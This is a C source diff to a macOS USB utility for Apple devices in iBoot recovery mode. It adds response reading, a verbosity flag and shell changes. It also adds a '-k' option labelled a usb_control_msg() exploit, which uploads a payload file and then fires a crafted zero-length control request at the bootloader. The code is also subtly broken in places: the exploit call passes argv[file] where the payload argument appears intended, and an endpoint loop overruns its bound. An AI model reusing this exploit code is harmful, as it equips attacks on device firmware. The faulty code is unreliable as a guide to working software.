@@ -15,16 +15,24 @@
 #define REQUEST_FILE 0x21
 #define REQUEST_STATUS 0xA1
 
+static int verbosity = 0;
+#define ibootutil_printf(...) { \
+	if(verbosity != 0) \
+		printf(__VA_ARGS__); \
+}
+
 struct iBootUSBConnection {
 	io_service_t usbService;
 	IOUSBDeviceInterface **deviceHandle;
+	IOUSBInterfaceInterface **interfaceHandle;
 	CFStringRef name, serial;
+	UInt8 responsePipeRef;
 	unsigned int idProduct, open;
 };
 typedef struct iBootUSBConnection *iBootUSBConnection;
 
 void iDevice_print(iBootUSBConnection connection) {
-	if(connection != NULL) {
+	if(connection != NULL && verbosity != 0) {
 		if(connection->name && connection->serial) {
 			CFShow(connection->name);
 			CFShow(connection->serial);
@@ -55,6 +63,7 @@ iBootUSBConnection iDevice_open(uint32_t productID) {
 	
 	IOCFPlugInInterface **pluginInterface;
 	IOUSBDeviceInterface **deviceHandle;
+	IOUSBInterfaceInterface **interfaceHandle;
 	
 	SInt32 score;
 	if(IOCreatePlugInInterfaceForService(service, kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID, &pluginInterface, &score) != 0) {
@@ -75,19 +84,96 @@ iBootUSBConnection iDevice_open(uint32_t productID) {
 		(*deviceHandle)->Release(deviceHandle);
 		return NULL;
 	}
-
+	
+	// Claim interface -- PLEASE SOMEONE HELP WITH RESPONSE
+	
+	if((*deviceHandle)->SetConfiguration(deviceHandle, 1) != 0) {
+		IOObjectRelease(service);
+		(*deviceHandle)->USBDeviceClose(deviceHandle);
+		(*deviceHandle)->Release(deviceHandle);
+		return NULL;
+	}
+	
+	io_iterator_t iterator;
+	IOUSBFindInterfaceRequest interfaceRequest;
+	
+	interfaceRequest.bAlternateSetting 
+	= interfaceRequest.bInterfaceClass 
+	= interfaceRequest.bInterfaceProtocol 
+	= interfaceRequest.bInterfaceSubClass 
+	= kIOUSBFindInterfaceDontCare;
+	
+	if((*deviceHandle)->CreateInterfaceIterator(deviceHandle, &interfaceRequest, &iterator) != 0) {
+		IOObjectRelease(service);
+		(*deviceHandle)->USBDeviceClose(deviceHandle);
+		(*deviceHandle)->Release(deviceHandle);
+		return NULL;
+	}
+	
+	io_service_t usbInterface;
+	UInt8 found_interface = 0, index = 0;
+	while(usbInterface = IOIteratorNext(iterator)) {
+		if(index < 1) {
+			index++;
+			continue;
+		}
+		
+		IOCFPlugInInterface **iodev;
+		
+		SInt32 score;
+		if(IOCreatePlugInInterfaceForService(usbInterface, kIOUSBInterfaceUserClientTypeID, kIOCFPlugInInterfaceID, &iodev, &score) != 0) {
+			IOObjectRelease(usbInterface);
+			continue;
+		}
+		
+		if((*iodev)->QueryInterface(iodev, CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID), (LPVOID)&interfaceHandle) != 0) {
+			(*iodev)->Release(iodev);
+			IOObjectRelease(usbInterface);
+			continue;
+		}
+		(*iodev)->Release(iodev);
+		
+		if((*interfaceHandle)->USBInterfaceOpen(interfaceHandle) != 0) {
+			(*interfaceHandle)->Release(interfaceHandle);
+			IOObjectRelease(usbInterface);
+			continue;
+		}
+		
+		UInt8 pipes;
+		(*interfaceHandle)->SetAlternateInterface(interfaceHandle, 1);
+		(*interfaceHandle)->GetNumEndpoints(interfaceHandle, &pipes);
+		
+		for(UInt8 i=0;i<=pipes;++i) {
+			UInt8 ind = i;
+			UInt8 direction, number, transferType, interval;
+			UInt16 maxPacketSize;
+			
+			(*interfaceHandle)->GetPipeProperties(interfaceHandle, ind, &direction, &number, &transferType, &maxPacketSize, &interval);
+			if(transferType == kUSBBulk && direction == kUSBIn) {
+				found_interface = i;
+				IOObjectRelease(usbInterface);
+				break;
+			}
+		}
+		
+		IOObjectRelease(usbInterface);
+	}
+	IOObjectRelease(iterator);
+	
 	CFStringRef productName = IORegistryEntryCreateCFProperty(service, CFSTR(kUSBProductString), kCFAllocatorDefault, 0);
 	CFStringRef productSerial = IORegistryEntryCreateCFProperty(service, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, 0);
 
 	iBootUSBConnection connection = malloc(sizeof(struct iBootUSBConnection));
 	memset(connection, '\0', sizeof(struct iBootUSBConnection));
 
+	connection->interfaceHandle = interfaceHandle;
 	connection->usbService = service;
 	connection->deviceHandle = deviceHandle;	
 	connection->name = productName;
 	connection->serial = productSerial;
 	connection->idProduct = productID;
 	connection->open = 1;
+	connection->responsePipeRef = found_interface;
 	
 	iDevice_print(connection);
 	
@@ -98,6 +184,8 @@ void iDevice_close(iBootUSBConnection connection) {
 	if(connection != NULL) {
 		if(connection->deviceHandle) (*connection->deviceHandle)->USBDeviceClose(connection->deviceHandle);
 		if(connection->deviceHandle) (*connection->deviceHandle)->Release(connection->deviceHandle);
+		if(connection->interfaceHandle) (*connection->interfaceHandle)->USBInterfaceClose(connection->interfaceHandle);
+		if(connection->interfaceHandle) (*connection->interfaceHandle)->Release(connection->interfaceHandle);
 		if(connection->name) CFRelease(connection->name);
 		if(connection->serial) CFRelease(connection->serial);
 		if(connection->usbService) IOObjectRelease(connection->usbService);
@@ -121,9 +209,9 @@ int iDevice_send_command(iBootUSBConnection connection, const char *command) {
 	request.wLenDone = 0x0;
 	
 	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &request) != kIOReturnSuccess) {
-		if(strcmp(command, "reboot") != 0) 
-			printf("Error sending command\n");
-		else {
+		if(strcmp(command, "reboot") != 0) {
+			ibootutil_printf("Error sending command\n");
+		} else {
 			printf("Rebooting device...\n");
 			iDevice_close(connection);
 			exit(0);
@@ -131,8 +219,6 @@ int iDevice_send_command(iBootUSBConnection connection, const char *command) {
 
 		return -1;
 	} 
-	
-	printf("Sent command: %s\n", command);
 	
 	return 0;
 }
@@ -246,7 +332,7 @@ int iDevice_send_file(iBootUSBConnection connection, const char *path) {
 	}
 	
 	free(buf);
-	printf("Sent file %s\n", path);
+	printf("Sent file\n");
 	
 	return 0;
 }
@@ -259,13 +345,73 @@ void iDevice_reset(iBootUSBConnection connection) {
 	iDevice_close(connection);
 }
 
+void read_callback(void *refcon, IOReturn result, void *arg0) {
+	for(int i=0;i<0x800;++i) {
+		printf("%c", ((char *)refcon)[i]);
+	}
+	for(int i=0;i<0x800;++i) {
+		printf("%c", ((char *)arg0)[i]);
+	}
+}
+
+int iDevice_usb_control_msg_exploit(iBootUSBConnection connection, const char *payload) {
+	if(connection == NULL || !connection->open) {
+		printf("device isn't open\n");
+		return -1;
+	}
+	
+	if(iDevice_send_file(connection, payload) != 0) {
+		printf("couldn't send payload\n");
+		return -1;
+	}
+	
+	IOUSBDevRequest checkup;
+	checkup.bmRequestType = REQUEST_FILE;
+	checkup.bRequest = 0x2;
+	checkup.wValue = 0x0;
+	checkup.wIndex = 0x0;
+	checkup.wLength = 0x0;
+	checkup.pData = 0x0;
+	checkup.wLenDone = 0x0;
+	
+	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &checkup) != 0) {
+		printf("couldn't send exploit message\n");
+		return -1;
+	}
+	
+	return 0;
+}
+
+int iDevice_read_response(iBootUSBConnection connection) {
+	UInt32 buf_size = 0x800;
+	char *buf = calloc(1, buf_size);
+	
+	((IOUSBInterfaceInterface182 *)(*connection->interfaceHandle))->ReadPipeTO(connection->interfaceHandle, connection->responsePipeRef, buf, &buf_size, 500, 1000);
+	for(int i=0;i<buf_size;++i) {
+		printf("%c", buf[i]);
+	}
+	
+	return 0;
+}
+
 int iDevice_start_shell(iBootUSBConnection connection, const char *prompt) {
 	if(connection == NULL)
 		return -1;
-
+	
+	int read_next_time = 1;
 	const char *input;
 	do {
+		if(read_next_time)
+			iDevice_read_response(connection);
+		else
+			read_next_time = 1;
 		input = readline(prompt);
+		if(input != NULL && input[0] != '\0') {
+			add_history(input);
+		} else {
+			read_next_time = 0;
+			continue;
+		}
 		if(input[0] == '/') {
 			if(strcmp(input, "/exit") == 0) {
 				iDevice_close(connection);
@@ -275,7 +421,9 @@ int iDevice_start_shell(iBootUSBConnection connection, const char *prompt) {
 				exit(0);
 			} else if(strstr(input, "/sendfile") != NULL) {
 				const char *file = (const char *)&input[strlen("/sendfile")+1];
+				printf("sending file...\n");
 				iDevice_send_file(connection, file);
+				read_next_time = 0;
 			}
 		} else {
 			iDevice_send_command(connection, input);
@@ -293,8 +441,10 @@ void usage() {
 	printf("\t-f <file>\tSend a file\n");
 	printf("\t-l <file>\trun commands by line in specified file\n");
 	printf("\t-a <idProduct>\tSpecify idProduct value manually\n\n");
+	printf("\t-k <payload>\tusb_control_msg() exploit\n");
 	printf("\t-r\t\tReset the usb connection\n");
-	printf("\t-s\t\tOpen a shell with iBoot\n\n");
+	printf("\t-s\t\tOpen a shell with iBoot\n");
+	printf("\t-p\t\tPrint text while performing operations\n\n");
 	
 	exit(0);
 }
@@ -307,7 +457,7 @@ int main (int argc, const char **argv) {
 	printf("by Gojohnnyboi\n\n");
 	iBootUSBConnection connection;
 	
-	int i, productID=0, command=0, reset=0, file=0, script=0, shell=0;
+	int i, productID=0, command=0, reset=0, file=0, script=0, shell=0, payload=0;
 	for(i=1;i<argc;++i) {
 		if(strcmp(argv[i], "-a") == 0) {
 			if(argv[i+1] == NULL) {
@@ -332,12 +482,20 @@ int main (int argc, const char **argv) {
 				shell=1;
 		} else if(strcmp(argv[i], "-r") == 0) {
 			reset=1;
+		} else if(strcmp(argv[i], "-p") == 0) {
+			verbosity = 1;
+		} else if(strcmp(argv[i], "-k") == 0) {
+			if(argv[i+1] == NULL) {
+				printf("-k requires that you specify a payload to send\n");
+				exit(1);
+			}
+			payload = (i+1);
 		}
 	}
 	
 	if(command) {
-		if(file || script || shell) {
-			printf("You can only specify one of the -cfsp options\n");
+		if(file || script || shell || payload) {
+			printf("You can only specify one of the -cfspk options\n");
 			exit(1);
 		}
 		
@@ -359,8 +517,8 @@ int main (int argc, const char **argv) {
 		exit(0);
 	}
 	if(file) {
-		if(command || script || shell) {
-			printf("You can only specify one of the -cfsp options\n");
+		if(command || script || shell || payload) {
+			printf("You can only specify one of the -cfspk options\n");
 			exit(1);
 		}
 		
@@ -397,8 +555,8 @@ int main (int argc, const char **argv) {
 	}
 	
 	if(shell) {
-		if(command || file || script) {
-			printf("You can only specify one of the -cfsp options\n");
+		if(command || file || script || payload) {
+			printf("You can only specify one of the -cfspk options\n");
 			exit(1);
 		}
 		
@@ -417,6 +575,27 @@ int main (int argc, const char **argv) {
 			printf("Couldn't open shell with iBoot\n");
 			exit(1);
 		}
+		
+		iDevice_close(connection);
+		exit(0);
+	}
+	
+	if(payload) {
+		if(command || file || script || shell) {
+			printf("You can only specify one of the -cfspk options\n");
+			exit(1);
+		}
+		
+		if(!productID)
+			productID = RECOVERY;
+		
+		connection = iDevice_open(productID);
+		if(connection == NULL) {
+			printf("Couldn't open device @ 0x%x\n", productID);
+			exit(1);
+		}
+		
+		iDevice_usb_control_msg_exploit(connection, argv[file]);
 		
 		iDevice_close(connection);
 		exit(0);
